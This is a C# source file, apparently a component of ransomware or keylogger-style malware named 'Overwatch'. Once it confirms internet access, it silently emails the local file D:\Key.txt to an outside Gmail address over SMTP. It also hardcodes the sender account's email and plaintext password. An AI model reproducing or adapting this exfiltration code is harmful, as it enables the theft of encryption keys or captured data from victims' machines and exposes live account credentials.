using System.Net;
using System.Net.Mail;
using System.IO;

namespace Overwatch
{
    class cSendingInformation
    {
        public void Sending() 
        {
            if (ConnectivityChecker.CheckInternet() == true)
            {
                MailAddress from = new MailAddress("isthechastener@gmail.com");
                MailAddress to = new MailAddress("satiriorn@gmail.com");
                MailMessage message = new MailMessage(from, to);
                message.Attachments.Add(new Attachment("D:\\Key.txt"));
                message.Subject = "Information";
                message.Body = "<h2>Information</h2>";
                message.IsBodyHtml = true;
                SmtpClient smtp = new SmtpClient("smtp.gmail.com", 25);
                smtp.Credentials = new NetworkCredential("isthechastener@gmail.com", "192020castle");
                smtp.EnableSsl = true;
                smtp.Send(message);
                message.Dispose();
            }
        }
    }
    public static class ConnectivityChecker
    {
        public static bool CheckInternet()
        {
            try
            {
                IPHostEntry entry = Dns.GetHostEntry("dns.msftncsi.com");
                if (entry.AddressList.Length == 0)
                    return false;
                else
                    if (!entry.AddressList[0].ToString().Equals("131.107.255.255"))
                        return true;
            }
            catch
            {
                return false;
            }

            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create("http://www.msftncsi.com/ncsi.txt");
            try
            {
                HttpWebResponse responce = (HttpWebResponse)request.GetResponse();

                if (responce.StatusCode != HttpStatusCode.OK)
                    return true;
                using (StreamReader sr = new StreamReader(responce.GetResponseStream()))
                {
                    if (sr.ReadToEnd().Equals("Microsoft NCSI"))
                        return true;
                    else
                        return true;
                }
            }
            catch
            {
                return false;
            }

        }
    }
}
